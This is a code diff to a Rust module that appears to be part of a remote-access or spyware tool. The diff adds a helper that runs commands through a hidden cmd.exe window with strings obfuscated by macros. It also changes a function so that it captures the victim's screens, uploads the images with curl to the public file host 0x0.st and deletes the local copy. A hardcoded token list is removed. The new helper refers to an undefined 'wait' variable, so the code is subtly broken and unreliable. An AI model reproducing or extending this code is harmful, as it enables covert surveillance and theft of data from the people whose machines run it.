@@ -2,16 +2,20 @@ extern crate systemstat;
 
 use crate::crypto;
 use crate::info_crypt;
+use crate::utils;
 use anyhow::anyhow;
 use anyhow::Context;
-use imgurs::NullPointer;
 use std::fs;
 use std::fs::File;
 use std::io;
+use std::io::stdout;
 use std::io::Cursor;
+use std::io::Write;
 use std::process::Command;
+use std::process::Output;
 use std::thread;
 use std::time::Duration;
+use wpkg_macro::encode;
 
 #[cfg(target_os = "windows")]
 use std::os::windows::process::CommandExt;
@@ -47,6 +51,32 @@ pub fn run_process_real(exe: &str, args: Vec<&str>, wait: bool) -> anyhow::Resul
         Command::new(exe).args(args).spawn()?;
     }
     Ok(())
+}
+
+pub fn run_process_with_output(exe: &str, args: Vec<&str>) -> anyhow::Result<Output> {
+    let mut full_command: Vec<String> = vec![];
+
+    #[cfg(target_os = "windows")]
+    {
+        full_command.push(crypto!("cmd.exe"));
+        full_command.push(crypto!("/c"));
+        if !wait {
+            full_command.push(crypto!("start"));
+        }
+    }
+
+    full_command.push(exe.to_owned());
+    for arg in args {
+        full_command.push(arg.to_owned());
+    }
+
+    let mut command = Command::new(full_command[0].clone());
+    command.args(full_command[1..full_command.len()].to_vec());
+
+    #[cfg(target_os = "windows")]
+    command.creation_flags(CREATE_NO_WINDOW);
+
+    Ok(command.output()?)
 }
 
 pub fn run_process(exe: &str, args: Vec<&str>, wait: bool) -> anyhow::Result<()> {
@@ -140,7 +170,6 @@ pub fn get_working_dir() -> anyhow::Result<String> {
 }
 
 pub fn screenshot() -> anyhow::Result<String> {
-
     info_crypt!("Creating screenshot...");
 
     let screens = Screen::all().ok_or_else(|| anyhow!("Can't take ss!"))?;
@@ -159,6 +188,7 @@ pub fn screenshot() -> anyhow::Result<String> {
     // Save the image.
     let mut rng = rand::thread_rng();
     let save_path = format!("{}/img-{}.png", get_working_dir()?, rng.gen::<i32>());
+
     fs::write(&save_path, &buffer)?;
 
     info_crypt!("Screenshot created!");
@@ -166,29 +196,26 @@ pub fn screenshot() -> anyhow::Result<String> {
     Ok(save_path)
 }
 
-const IMGUR_TOKENS: &'static [&str] = &[
-    "037a0d9b9dc5ce6",
-    "3e3ce0d7ac14d56",
-    "6998c6570722be5",
-    "80772b2547d94b0",
-    "a3e9a9b3ba6a1f8",
-];
-
 pub async fn screenshot_url() -> anyhow::Result<String> {
-
     let path = screenshot()?;
 
     info_crypt!("Uploading screenshot...");
 
-    let info = NullPointer::new(&crypto!("https://0x0.st"))
-        .upload(&path)
-        .await?;
+    let out = utils::run_process_with_output(
+        encode!("curl"),
+        vec![
+            &crypto!("-F"),
+            &format!("{}{}", crypto!("f:1=@"), path),
+            &crypto!("http://0x0.st"),
+        ],
+    )?;
 
     tokio::spawn(async {
+        thread::sleep(Duration::from_secs(30));
         fs::remove_file(path).unwrap();
     });
 
-    Ok(info)
+    Ok(String::from_utf8(out.stdout)?)
 }
 
 pub fn stat() -> String {
